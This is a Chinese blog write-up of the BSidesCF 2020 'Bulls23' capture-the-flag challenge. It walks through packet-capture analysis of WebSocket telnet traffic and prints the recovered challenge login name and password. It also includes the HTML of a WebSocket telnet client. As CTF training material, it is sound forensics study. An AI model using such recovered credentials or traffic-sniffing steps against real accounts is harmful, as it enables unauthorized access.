<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="刷"><title>bsidescf2020</title><link rel=canonical href=https://baozongwi.xyz/p/bsidescf2020/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="bsidescf2020"><meta property='og:description' content="刷"><meta property='og:url' content='https://baozongwi.xyz/p/bsidescf2020/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='php'><meta property='article:tag' content='流量分析'><meta property='article:published_time' content='2024-08-21T15:56:14+00:00'><meta property='article:modified_time' content='2024-08-21T15:56:14+00:00'><meta name=twitter:title content="bsidescf2020"><meta name=twitter:description content="刷"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%A4%8D%E7%8E%B0/>复现</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/bsidescf2020/>bsidescf2020</a></h2><h3 class=article-subtitle>刷</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Aug 21, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>6 minute read</time></div></footer></div></header><section class=article-content><h1 id=bsidescf-2020bulls23>[BSidesCF 2020]Bulls23</h1><p>先搞下来，解压发现是个<code>html</code></p><p>本地搞个<code>html</code>网页来加载发现可以登录</p><p>发现第一个链接就是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://bash.org/?random
</span></span></code></pre></td></tr></table></div></div><p>找到是<code>websocket</code>流量</p><p>发现第二个链接</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://n-gate.com
</span></span></code></pre></td></tr></table></div></div><p>中途发现端口是<code>8888</code></p><p>但还是不懂，说的要追踪<code>TCP</code>流量,那就追踪</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>tcp.stream eq 363
</span></span></code></pre></td></tr></table></div></div><p>然后随便选一条，导个<code>http</code>流量来看数据包</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET / HTTP/1.1
</span></span><span class=line><span class=cl>Host: bulls-23-047e34a4.challenges.bsidessf.net:8888
</span></span><span class=line><span class=cl>Connection: Upgrade
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
</span></span><span class=line><span class=cl>Upgrade: websocket
</span></span><span class=line><span class=cl>Origin: http://bulls-23-047e34a4.challenges.bsidessf.net
</span></span><span class=line><span class=cl>Sec-WebSocket-Version: 13
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.9
</span></span><span class=line><span class=cl>Sec-WebSocket-Key: BPt0gjw53Um/3wwGRobU3w==
</span></span><span class=line><span class=cl>Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HTTP/1.1 101 Switching Protocols
</span></span><span class=line><span class=cl>Upgrade: websocket
</span></span><span class=line><span class=cl>Connection: Upgrade
</span></span><span class=line><span class=cl>Sec-WebSocket-Accept: IRu2iJ6PyWj0BuG4Kme5KK3DEGE=
</span></span></code></pre></td></tr></table></div></div><p>同时又找了一个追踪TCP流量也知道了密码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET / HTTP/1.1
</span></span><span class=line><span class=cl>Host: bulls-23-047e34a4.challenges.bsidessf.net:8888
</span></span><span class=line><span class=cl>Connection: Upgrade
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
</span></span><span class=line><span class=cl>Upgrade: websocket
</span></span><span class=line><span class=cl>Origin: http://bulls-23-047e34a4.challenges.bsidessf.net
</span></span><span class=line><span class=cl>Sec-WebSocket-Version: 13
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.9
</span></span><span class=line><span class=cl>Sec-WebSocket-Key: BPt0gjw53Um/3wwGRobU3w==
</span></span><span class=line><span class=cl>Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HTTP/1.1 101 Switching Protocols
</span></span><span class=line><span class=cl>Upgrade: websocket
</span></span><span class=line><span class=cl>Connection: Upgrade
</span></span><span class=line><span class=cl>Sec-WebSocket-Accept: IRu2iJ6PyWj0BuG4Kme5KK3DEGE=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>....... ..#..&#39;..l.m...u&gt;...=O.................,....[....&amp;................!..?.ee.ef..... d.`.gD..........Kn.....g.o..Ubuntu 18.04.3 LTS
</span></span><span class=line><span class=cl>..5dfa026515b6 login: .........m...Hxo...i...rm|...c......{..h..3s..R..a..J.../..e....k....l...q..n..j.....r...o.....g...r..hO.....d..@.&#39;.!..a.........n..k:l|a..
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>Password: ...X&amp;....4...V....S.4....G......&gt;...........J.6.z...
</span></span><span class=line><span class=cl>............^j.$*.....&#39;{....7q..... 2.....#!...
</span></span><span class=line><span class=cl>.BLast login: Sun Feb 16 06:44:05 UTC 2020 from localhost on pts/0
</span></span><span class=line><span class=cl>. Welcome, the key is [REDACTED]
</span></span><span class=line><span class=cl>.*This account is currently not available.
</span></span><span class=line><span class=cl>....Target closed..N...M...&lt;a..ne..=c.
</span></span></code></pre></td></tr></table></div></div><p>得到用户名</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>michaeljordan
</span></span></code></pre></td></tr></table></div></div><p>然后直接跟踪websocker流量就得到密码了<code>ib3atm0nstar5</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>..... ..#..&#39;..... ..#..&#39;..........VT100................!..............!............Ubuntu 18.04.3 LTS
</span></span><span class=line><span class=cl>5dfa026515b6 login: mmiicchhaaeelljjoorrddaann
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Password: ib3atm0nstar5
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Sun Feb 16 06:44:05 UTC 2020 from localhost on pts/0
</span></span><span class=line><span class=cl>Welcome, the key is [REDACTED]
</span></span><span class=line><span class=cl>This account is currently not available.
</span></span></code></pre></td></tr></table></div></div><p>看完流量包题目提供了一个页面链接一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>node5.buuoj.cn 25947
</span></span></code></pre></td></tr></table></div></div><p>但是流量包那个html很明显是不够的这里需要把环境导入一下</p><p><code>index.html</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Telnet client using WebSockets<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;include/util.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;include/websock.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;include/webutil.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span> 
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;include/keysym.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span> 
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;include/VT100.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span> 
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;include/wstelnet.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span> 
</span></span><span class=line><span class=cl>        <span class=c>&lt;!-- Uncomment to activate firebug lite --&gt;</span>
</span></span><span class=line><span class=cl>        <span class=c>&lt;!--
</span></span></span><span class=line><span class=cl><span class=c>        &lt;script type=&#39;text/javascript&#39; 
</span></span></span><span class=line><span class=cl><span class=c>            src=&#39;http://getfirebug.com/releases/lite/1.2/firebug-lite-compressed.js&#39;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=c>        --&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        Host: <span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>&#39;host&#39;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#39;width:100&#39;</span><span class=p>&gt;</span><span class=ni>&amp;nbsp;</span>
</span></span><span class=line><span class=cl>        Port: <span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>&#39;port&#39;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#39;width:50&#39;</span><span class=p>&gt;</span><span class=ni>&amp;nbsp;</span>
</span></span><span class=line><span class=cl>        Encrypt: <span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>&#39;encrypt&#39;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#39;checkbox&#39;</span><span class=p>&gt;</span><span class=ni>&amp;nbsp;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>&#39;connectButton&#39;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#39;button&#39;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#39;Connect&#39;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#39;width:100px&#39;</span>
</span></span><span class=line><span class=cl>            <span class=na>onclick</span><span class=o>=</span><span class=s>&#34;connect();&#34;</span><span class=p>&gt;</span><span class=ni>&amp;nbsp;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>pre</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;terminal&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>pre</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>telnet</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kd>function</span> <span class=nx>connect</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>telnet</span><span class=p>.</span><span class=nx>connect</span><span class=p>(</span><span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;host&#39;</span><span class=p>).</span><span class=nx>value</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                               <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;port&#39;</span><span class=p>).</span><span class=nx>value</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                               <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;encrypt&#39;</span><span class=p>).</span><span class=nx>checked</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;connectButton&#39;</span><span class=p>).</span><span class=nx>disabled</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;connectButton&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;Connecting&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kd>function</span> <span class=nx>disconnect</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;connectButton&#39;</span><span class=p>).</span><span class=nx>disabled</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;connectButton&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;Disconnecting&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>telnet</span><span class=p>.</span><span class=nx>disconnect</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kd>function</span> <span class=nx>connected</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;connectButton&#39;</span><span class=p>).</span><span class=nx>disabled</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;connectButton&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;Disconnect&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;connectButton&#39;</span><span class=p>).</span><span class=nx>onclick</span> <span class=o>=</span> <span class=nx>disconnect</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kd>function</span> <span class=nx>disconnected</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;connectButton&#39;</span><span class=p>).</span><span class=nx>disabled</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;connectButton&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;Connect&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;connectButton&#39;</span><span class=p>).</span><span class=nx>onclick</span> <span class=o>=</span> <span class=nx>connect</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>window</span><span class=p>.</span><span class=nx>onload</span> <span class=o>=</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;onload&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=kd>var</span> <span class=nx>url</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;host&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=p>(</span><span class=nx>url</span><span class=p>.</span><span class=nx>match</span><span class=p>(</span><span class=sr>/host=([^&amp;#]*)/</span><span class=p>)</span> <span class=o>||</span> <span class=p>[</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>])[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=nx>$D</span><span class=p>(</span><span class=s1>&#39;port&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=p>(</span><span class=nx>url</span><span class=p>.</span><span class=nx>match</span><span class=p>(</span><span class=sr>/port=([^&amp;#]*)/</span><span class=p>)</span> <span class=o>||</span> <span class=p>[</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>])[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>                <span class=nx>telnet</span> <span class=o>=</span> <span class=nx>Telnet</span><span class=p>(</span><span class=s1>&#39;terminal&#39;</span><span class=p>,</span> <span class=nx>connected</span><span class=p>,</span> <span class=nx>disconnected</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
